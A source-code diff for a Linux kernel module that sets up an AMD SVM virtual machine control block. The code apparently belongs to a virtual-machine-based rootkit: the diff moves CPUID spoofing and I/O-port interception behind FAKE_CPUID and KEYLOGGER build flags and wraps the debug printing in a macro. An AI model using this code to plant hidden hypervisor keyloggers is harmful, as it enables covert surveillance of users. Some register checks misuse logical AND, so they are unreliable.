@@ -9,6 +9,12 @@
 #include "exit_handle.h"
 #include "io.h"
 
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
 extern void * __global_Host_Reg_Store; 
 extern void * __global_Guest_Reg_Store;
 extern void * __global_VMCB_VA;
@@ -89,12 +95,12 @@ static void store_guest_cpu_info(vmcb_t * vmcb, uint64_t rip, uint64_t rsp, uint
 	// Store IDTR, GDTR [Done]
 	idtr = get_idtr();
 	vmcb->state_save_area.idtr.base = idtr.base;
-	printk("\nIDTR BASE: %llx\n\n", idtr.base);
+	DEBUG_PRINT("\nIDTR BASE: %llx\n\n", idtr.base);
 	vmcb->state_save_area.idtr.limit = idtr.limit;
 
 	gdtr = get_gdtr();
 	vmcb->state_save_area.gdtr.base = gdtr.base;
-	printk("\nGDTR BASE: %llx\n\n", gdtr.base);
+	DEBUG_PRINT("\nGDTR BASE: %llx\n\n", gdtr.base);
 	vmcb->state_save_area.gdtr.limit = gdtr.limit;
 
 	// Store ES and DS
@@ -130,7 +136,7 @@ static void store_guest_cpu_info(vmcb_t * vmcb, uint64_t rip, uint64_t rsp, uint
 
 	// Set VMRUN intercept bit to 1
 	vmcb->control_area.svm_instr_intercepts.VMRUN = 1;
-	//printk("VMCB SVM INSTR INTERCEPTS: %lx\n", vmcb->control_area.svm_instr_intercepts.val);
+	//DEBUG_PRINT("VMCB SVM INSTR INTERCEPTS: %lx\n", vmcb->control_area.svm_instr_intercepts.val);
 
 	vmcb->control_area.N_CR3 = get_cr3();
 	// Stuff for VMLOAD + VMSAVE
@@ -161,21 +167,10 @@ static void store_guest_cpu_info(vmcb_t * vmcb, uint64_t rip, uint64_t rsp, uint
 	// vmcb->state_save_area.tr.base = tr.base;
 	// vmcb->state_save_area.tr.limit = tr.limit;
 	// vmcb->state_save_area.tr.selector = tr.selector;
-
-	// This is the fun part...
-	//vmcb->control_area.instr_intercepts.RDTSC = 1;  // Intercept RDTSC Instruction
-	vmcb->control_area.instr_intercepts.CPUID = 1;	// Intercept CPUID Instruction
-
-	// Catching physical interrupts
-	//vmcb->control_area.instr_intercepts.INTR = 1;
-	//vmcb->control_area.guest_int_ctrl.V_INTR_MASK = 1;	// Host IF for P-ints. Guest IF only for V-ints.
-
-	// IO Port
-	vmcb->control_area.instr_intercepts.IOIO_PROT = 1;
 }
 
 /*
-
+	This is the big boy. Gets called by our VM_Setup_and_Run() assembly routine to set the VMCB up for it's initial run.
 */
 phys_addr_t vmcb_init(uint64_t rip, uint64_t rsp, uint64_t rax, uint64_t rflags) {
 
@@ -185,19 +180,22 @@ phys_addr_t vmcb_init(uint64_t rip, uint64_t rsp, uint64_t rax, uint64_t rflags)
 	// Allocate VMCB Region
 	vmcb_ptr = (vmcb_t *)kzalloc(VMCB_SIZE, GFP_KERNEL);
 	if (!vmcb_ptr){
-		printk("Failed to allocate VMCB\n");
+		DEBUG_PRINT("Failed to allocate VMCB\n");
 		return -1;
 	}
 	
-	printk("VMCB allocated at %px\n", vmcb_ptr);
+	DEBUG_PRINT("VMCB allocated at %px\n", vmcb_ptr);
     phys_vmcb_ptr = virt_to_phys((void *) vmcb_ptr);
 
-	printk("Physical VMCB %llx\n", phys_vmcb_ptr);
+	DEBUG_PRINT("Physical VMCB %llx\n", phys_vmcb_ptr);
 	__global_VMCB_VA = (void *) vmcb_ptr; 
 	__global_VMCB_PA = phys_vmcb_ptr;
 
 	// Populate the VMCB
 	store_guest_cpu_info(vmcb_ptr, rip, rsp, rax, rflags);
+
+	// Set things to interrupt/functionality of our VMBR
+	set_exit_reasons();
 
 	// need to setup the IOIO_PROT address and stuff
 	// allocate 12 Kbyte for the port mapping
@@ -210,6 +208,21 @@ phys_addr_t vmcb_init(uint64_t rip, uint64_t rsp, uint64_t rax, uint64_t rflags)
 	return phys_vmcb_ptr;
 }
 
+void set_exit_reasons(void){
+	vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
+
+	#ifdef FAKE_CPUID
+		vmcb->control_area.instr_intercepts.CPUID = 1;	// Intercept CPUID Instruction
+	#endif
+
+	// Physical interrupt stuff
+	//vmcb->control_area.instr_intercepts.INTR = 1;
+	//vmcb->control_area.guest_int_ctrl.V_INTR_MASK = 1;	// Host IF for P-ints. Guest IF only for V-ints.
+
+	#ifdef KEYLOGGER
+		vmcb->control_area.instr_intercepts.IOIO_PROT = 1;
+	#endif
+}
 
 /*
 	Utility: Check the VMCB for faulty state
@@ -247,11 +260,11 @@ void consistency_checks(void){
 	//uint64_t cs_d_bit = 0x1UL << (22 + 32);
 
 	// Just gonna print out the saved RIP
-	printk("Saved RIP: %llx\n", vmcb->state_save_area.rip);
+	DEBUG_PRINT("Saved RIP: %llx\n", vmcb->state_save_area.rip);
 
 	// EFER.SVME is zero
 	if (!(read_msr(EFER_MSR) & _SVME)){
-		printk("ERROR: EFER.SVME bit is zero\n");
+		DEBUG_PRINT("ERROR: EFER.SVME bit is zero\n");
 	}
 
 	// CR0.CD is zero and CR0.NW is set
@@ -259,37 +272,37 @@ void consistency_checks(void){
 	// NW (Not Writethrough) @ [29]
 
 	if ((cr0.CD == 0) && (cr0.NW)){
-		printk("ERROR: CR0.CD and CR0.NW issue\n");
+		DEBUG_PRINT("ERROR: CR0.CD and CR0.NW issue\n");
 	}
 
 	// CR0[64:32] are not zero
 	if (cr0.rsvd3 != 0) {
-		printk("ERROR: CR0[63:32] not zero\n");
+		DEBUG_PRINT("ERROR: CR0[63:32] not zero\n");
 	}
 
 	// Any MBZ bit of CR3 is set (gonna check long mode here)
 	if ((cr3 & cr3_mbz) != 0){
-		printk("ERROR: CR3 MBZ bits set\n");
+		DEBUG_PRINT("ERROR: CR3 MBZ bits set\n");
 	}
 
 	// Any MBZ of CR4 set
 	if ((cr4 & cr4_mbz) != 0){
-		printk("ERROR: CR4 MBZ bits set\n");
+		DEBUG_PRINT("ERROR: CR4 MBZ bits set\n");
 	}
 
 	// DR6[63:32] are not zero
 	if (dr6 && (0xffffffffUL << 32)) {
-		printk("ERROR: DR6[63:32] are not zero\n");
+		DEBUG_PRINT("ERROR: DR6[63:32] are not zero\n");
 	}
 
 	// DR7[63:32] are not zero
 	if (dr7 && (0xffffffffUL << 32)) {
-		printk("ERROR: DR7[63:32] are not zero\n");
+		DEBUG_PRINT("ERROR: DR7[63:32] are not zero\n");
 	}
 
 	// Any EFER MBZ Bit of EFER set
 	if (efer_reg.rsvd0 || efer_reg.rsvd1 || efer_reg.rsvd2 || efer_reg.rsvd3 || efer_reg.rsvd4 ) {
-		printk("ERROR: EFER MBZ bits set\n");
+		DEBUG_PRINT("ERROR: EFER MBZ bits set\n");
 	}
 
 	// THis check is only for if the processor doesn't support long mode.
@@ -297,25 +310,25 @@ void consistency_checks(void){
 
 	// EFER.LME and CR0.PG are both set and CR4.PAE is zero
 	if ((efer_reg.LME && cr0.PG && !(cr4 & cr4_pae_bit))) {
-		printk("ERROR: LME + PG = 1 and CR4.PAE = 0\n");
+		DEBUG_PRINT("ERROR: LME + PG = 1 and CR4.PAE = 0\n");
 	}
 
 	// EFER.LME and CR0.PG are both non-zero and CR0.PE is zero
 	if ((efer_reg.LME && cr0.PG) && !(cr0.PE)) {
-		printk("ERROR: LME + PG = 1 and CR0.PE = 0\n");
+		DEBUG_PRINT("ERROR: LME + PG = 1 and CR0.PE = 0\n");
 	}
 
 	/*
 	// EFER.LME, CR0.PG, CR4.PAE, CS.L, and CS.D are all non-zero
 	if (efer_reg.LME && cr0.PG && (cr4 & cr4_pae_bit) && (cs & cs_long_bit) && (cs & cs_d_bit)) {
-		printk("ERROR: EFER.LME, CR0.PG, CR4.PAE, CS.L, and CS.D are all non-zero\n");
+		DEBUG_PRINT("ERROR: EFER.LME, CR0.PG, CR4.PAE, CS.L, and CS.D are all non-zero\n");
 	}
 	*/
 
 	// The VMRUN intercept bit is clear.
 	if (vmcb->control_area.svm_instr_intercepts.VMRUN == 0) {
-		printk("ERROR: The VMRUN intercept bit is clear.\n");
-		printk("VMCB VMRUN INTERCEPT BIT: %d\n", vmcb->control_area.svm_instr_intercepts.VMRUN);
+		DEBUG_PRINT("ERROR: The VMRUN intercept bit is clear.\n");
+		DEBUG_PRINT("VMCB VMRUN INTERCEPT BIT: %d\n", vmcb->control_area.svm_instr_intercepts.VMRUN);
 	}
 
 	// I've got absolutely no clue what these two are. Will do them tomorrow :D
@@ -324,18 +337,18 @@ void consistency_checks(void){
 
 	// ASID is equal to zero.
 	if (vmcb->control_area.guest_asid == 0){
-		printk("ERROR: ASID is equal to zero.\n");
+		DEBUG_PRINT("ERROR: ASID is equal to zero.\n");
 	}
 
 	// TODO: WIll need to make this cleaner ofc...
 	// Any reserved bit is set in S_CET
 	if (vmcb->state_save_area.s_cet & 0xfffffffffffffffc) {
-		printk("Reserved bit of S_CET set\n");
+		DEBUG_PRINT("Reserved bit of S_CET set\n");
 	}
 
 	// CR4.CET=1 when CR0.WP=0
 	if ((cr4 & cr4_cet_bit) && !(cr0.WP)){
-		printk("ERROR: CR4.CET=1 when CR0.WP=0\n");
+		DEBUG_PRINT("ERROR: CR4.CET=1 when CR0.WP=0\n");
 	}
 
 	// TODO: CR4.CET=1 and U_CET.SS=1 when EFLAGS.VM=1
@@ -364,9 +377,9 @@ void consistency_checks(void){
 void debug_vmcb(vmcb_t * vmcb){
 	int ssa_offset = 0x400;
 
-	printk("----- BEGIN VMCB DEBUG OUTPUT -----\n");
-	printk("VMCB Virt Addr: %px\n", vmcb);
-	printk("VMCB Phys Addr: %llx\n", virt_to_phys(vmcb));
+	DEBUG_PRINT("----- BEGIN VMCB DEBUG OUTPUT -----\n");
+	DEBUG_PRINT("VMCB Virt Addr: %px\n", vmcb);
+	DEBUG_PRINT("VMCB Phys Addr: %llx\n", virt_to_phys(vmcb));
 	// WARNING: I don't actually look inside of the structs of each of these just yet.
 	// This means that the offsets within certain structs could still be wrong.
 	// In other words, these checks are not exhaustive.
@@ -423,7 +436,7 @@ void debug_vmcb(vmcb_t * vmcb){
 
 	check_entry_offset(0x108, (uint64_t) &vmcb->control_area.vmsa_info, "vmsa_info");
 
-	printk("Control area kinda done checking... \n");
+	DEBUG_PRINT("Control area kinda done checking... \n");
 
 	check_entry_offset(ssa_offset + 0x000, (uint64_t) &vmcb->state_save_area.es, "es");
 	check_entry_offset(ssa_offset + 0x010, (uint64_t) &vmcb->state_save_area.cs, "cs");
@@ -471,18 +484,18 @@ void debug_vmcb(vmcb_t * vmcb){
 
 	check_entry_offset(ssa_offset + 0x2E0, (uint64_t) &vmcb->state_save_area.spec_ctrl, "spec_ctrl");
 
-	printk("State-save area kinda done checking... \n");
+	DEBUG_PRINT("State-save area kinda done checking... \n");
 
-	printk("----- END VMCB DEBUG OUTPUT -----\n");
+	DEBUG_PRINT("----- END VMCB DEBUG OUTPUT -----\n");
 }
 
 // A helper we'll use for checking that our VMCB struct is accurate.
 void check_entry_offset(uint16_t offset, uint64_t e_ptr, char * name){
 	// The VMCB is only like 4KB (0x1000) wide. Offsets shouldn't be going past this. 
 	if ((e_ptr & 0xfff) != offset){
-		printk("VMCB_T INCORRECT. %s is at offset 0x%x, should be at 0x%x\n", name, (uint16_t)(e_ptr & 0xfff), offset);
+		DEBUG_PRINT("VMCB_T INCORRECT. %s is at offset 0x%x, should be at 0x%x\n", name, (uint16_t)(e_ptr & 0xfff), offset);
 	}
-	printk("DEBUG- %s at 0x%x: %llx", name, (uint16_t)(e_ptr & 0xfff), *(uint64_t *)e_ptr);
+	DEBUG_PRINT("DEBUG- %s at 0x%x: %llx", name, (uint16_t)(e_ptr & 0xfff), *(uint64_t *)e_ptr);
 	return;
 }
 
